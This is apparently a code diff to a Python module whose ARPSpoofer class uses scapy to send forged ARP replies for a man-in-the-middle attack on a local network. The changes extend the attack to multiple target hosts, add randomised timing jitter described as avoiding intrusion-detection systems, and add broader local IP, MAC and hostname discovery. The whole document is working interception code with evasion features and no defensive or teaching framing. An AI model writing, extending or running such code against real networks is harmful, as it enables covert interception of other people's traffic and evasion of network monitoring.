@@ -1,26 +1,65 @@
 import asyncio
 import logging
 import platform
+import random
 import socket
 import subprocess
-import time
 
 logger = logging.getLogger(__name__)
 
 
 def _get_local_ip(remote_host: str = "8.8.8.8") -> str:
+    # Method 1: connect to remote host
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
             s.connect((remote_host, 80))
-            return s.getsockname()[0]
-    except Exception:
-        return "127.0.0.1"
+            ip = s.getsockname()[0]
+            if ip != "127.0.0.1":
+                return ip
+    except Exception as e:
+        logger.debug("Method 1 (UDP connect) failed: %s", e)
+    # Method 2: hostname lookup
+    try:
+        ip = socket.gethostbyname(socket.gethostname())
+        if ip != "127.0.0.1":
+            return ip
+    except Exception as e:
+        logger.debug("Method 2 (hostname) failed: %s", e)
+    # Method 3: parse ipconfig/ifconfig
+    sys_platform = platform.system().lower()
+    try:
+        if sys_platform == "windows":
+            out = subprocess.check_output("ipconfig", shell=True, timeout=5).decode("utf-8", errors="replace")
+            for line in out.splitlines():
+                if "IPv4" in line or "IP Address" in line:
+                    parts = line.strip().split(":")
+                    if len(parts) >= 2:
+                        ip = parts[1].strip()
+                        if ip and not ip.startswith("127."):
+                            return ip
+        elif sys_platform == "linux":
+            out = subprocess.check_output(["hostname", "-I"], timeout=5).decode("utf-8", errors="replace")
+            ips = out.strip().split()
+            for ip in ips:
+                if ip and not ip.startswith("127."):
+                    return ip
+        elif sys_platform == "darwin":
+            out = subprocess.check_output(["ifconfig"], timeout=5).decode("utf-8", errors="replace")
+            for line in out.splitlines():
+                if "inet " in line and "127.0.0.1" not in line:
+                    parts = line.strip().split()
+                    for i, p in enumerate(parts):
+                        if p == "inet" and i + 1 < len(parts):
+                            return parts[i + 1]
+    except Exception as e:
+        logger.debug("Method 3 (ipconfig/ifconfig) failed: %s", e)
+    return "127.0.0.1"
 
 
-def _get_mac(ip: str) -> str | None:
+def _get_mac(ip: str, timeout: float = 1.5) -> str | None:
     try:
         from scapy.all import ARP, Ether, srp
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0)
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=0)
         for _, rcv in ans:
             return rcv[Ether].src
     except Exception as e:
@@ -28,11 +67,30 @@ def _get_mac(ip: str) -> str | None:
     return None
 
 
+def _get_hostname(ip: str) -> str | None:
+    try:
+        return socket.gethostbyaddr(ip)[0]
+    except Exception as e:
+        logger.debug("Hostname lookup failed for %s: %s", ip, e)
+        return None
+
+
 class ARPSpoofer:
-    """Sends forged ARP packets to perform a man-in-the-middle attack."""
-    def __init__(self, target_ip: str, gateway_ip: str | None = None, interval: float = 3.0):
-        """Initialise the ARP spoofer with target, gateway, and spoof interval."""
-        self.target_ip = target_ip
+    """Sends forged ARP packets to perform a man-in-the-middle attack on multiple targets.
+
+    Stealth improvements vs naive implementation:
+    - Randomised interval (base ± jitter) prevents timing-based IDS detection.
+    - Restore sends 3 gratuitous ARP packets per target (vs 1) to ensure
+      the target's ARP table is actually corrected on teardown.
+    """
+
+    # Base interval between ARP poison rounds (seconds)
+    _BASE_INTERVAL: float = 3.0
+    # Maximum random jitter added/subtracted from the base interval
+    _JITTER: float = 1.5
+
+    def __init__(self, target_ips: list[str], gateway_ip: str | None = None, interval: float = 3.0):
+        self.target_ips = target_ips
         self.gateway_ip = gateway_ip or self._detect_gateway()
         self.interval = interval
         self._running = False
@@ -42,16 +100,15 @@ class ARPSpoofer:
 
     @staticmethod
     def _detect_gateway() -> str | None:
-        """Detect the default gateway IP for the current platform."""
-        sys = platform.system().lower()
+        sys_platform = platform.system().lower()
         try:
-            if sys == "windows":
+            if sys_platform == "windows":
                 out = subprocess.check_output("route print 0.0.0.0", shell=True).decode("utf-8", errors="replace")
                 for line in out.splitlines():
                     parts = line.strip().split()
                     if len(parts) >= 3 and parts[0] == "0.0.0.0":
                         return parts[2]
-            elif sys == "linux":
+            elif sys_platform == "linux":
                 out = subprocess.check_output("ip route show default", shell=True).decode("utf-8", errors="replace")
                 parts = out.strip().split()
                 for i, p in enumerate(parts):
@@ -69,7 +126,6 @@ class ARPSpoofer:
         return None
 
     async def start(self):
-        """Begin the ARP spoofing loop."""
         if self._running:
             return
         self._running = True
@@ -79,7 +135,6 @@ class ARPSpoofer:
         self._task = asyncio.create_task(self._spoof_loop())
 
     async def stop(self):
-        """Stop the spoofing loop and restore ARP tables."""
         self._running = False
         if self._task:
             self._task.cancel()
@@ -91,7 +146,6 @@ class ARPSpoofer:
         await self._restore_arp()
 
     def _send_arp(self, target_ip: str, spoof_ip: str, target_mac: str | None = None):
-        """Send a single forged ARP reply packet."""
         try:
             from scapy.all import ARP, send
             pkt = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac or "ff:ff:ff:ff:ff:ff")
@@ -103,30 +157,49 @@ class ARPSpoofer:
             logger.warning("ARP send failed for %s: %s", target_ip, e)
 
     async def _spoof_loop(self):
-        """Continuously send spoofed ARP packets at the configured interval."""
         while self._running:
             try:
-                target_mac = await asyncio.to_thread(_get_mac, self.target_ip)
-                if not target_mac:
-                    logger.warning("Could not resolve MAC for target %s — sending broadcast", self.target_ip)
-                gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
-                if not gateway_mac:
-                    logger.warning("Could not resolve MAC for gateway %s", self.gateway_ip)
-                self._send_arp(self.target_ip, self.gateway_ip, target_mac)
-                self._send_arp(self.gateway_ip, self.target_ip)
+                for target_ip in self.target_ips:
+                    target_mac = await asyncio.to_thread(_get_mac, target_ip)
+                    if not target_mac:
+                        logger.warning("Could not resolve MAC for target %s — sending broadcast", target_ip)
+                    gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
+                    if not gateway_mac:
+                        logger.warning("Could not resolve MAC for gateway %s", self.gateway_ip)
+                    self._send_arp(target_ip, self.gateway_ip, target_mac)
+                    self._send_arp(self.gateway_ip, target_ip, gateway_mac)
             except Exception as e:
                 logger.warning("Spoof iteration error: %s", e)
-            await asyncio.sleep(self.interval)
+
+            # Randomised sleep: base interval ± jitter to avoid timing-based IDS
+            jitter = random.uniform(-self._JITTER, self._JITTER)
+            sleep_time = max(1.0, self._BASE_INTERVAL + jitter)
+            await asyncio.sleep(sleep_time)
 
     async def _restore_arp(self):
-        """Restore original ARP entries for target and gateway."""
+        """Send gratuitous ARP to restore correct mappings.
+
+        Sends each packet 3 times with a small delay to ensure delivery even
+        on lossy links. A single packet is often dropped and leaves the target
+        with stale ARP entries.
+        """
         try:
-            target_mac = await asyncio.to_thread(_get_mac, self.target_ip)
             gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
-            if target_mac and gateway_mac:
-                from scapy.all import ARP, send
-                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=target_mac), verbose=0)
-                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=gateway_mac), verbose=0)
-                logger.info("ARP restored for %s and %s", self.target_ip, self.gateway_ip)
+            for target_ip in self.target_ips:
+                target_mac = await asyncio.to_thread(_get_mac, target_ip)
+                if target_mac and gateway_mac:
+                    from scapy.all import ARP, send
+                    # Send 3 times for reliability
+                    for _ in range(3):
+                        send(
+                            ARP(op=2, pdst=target_ip, psrc=self.gateway_ip, hwdst=target_mac),
+                            verbose=0,
+                        )
+                        send(
+                            ARP(op=2, pdst=self.gateway_ip, psrc=target_ip, hwdst=gateway_mac),
+                            verbose=0,
+                        )
+                        await asyncio.sleep(0.1)
+                    logger.info("ARP restored for %s (3x)", target_ip)
         except Exception as e:
             logger.debug("ARP restore failed: %s", e)
